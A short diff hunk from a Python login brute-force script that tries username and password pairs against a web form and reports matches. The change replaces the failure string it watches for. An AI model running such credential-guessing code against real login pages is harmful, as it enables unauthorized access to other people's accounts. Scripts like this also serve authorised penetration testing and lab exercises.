@@ -54,7 +54,7 @@ def enum_password(validUsers):
             response = requests.post(url, data=payload, verify=False)
 
             # check if the "Invalid password" is in the response, if not then valid password
-            if "Incorrect password" not in response.text:
+            if "Invalid username or password" not in response.text:
                 print(f"\t[+] Found valid username:password pair {user}:{password}")
                 break
 
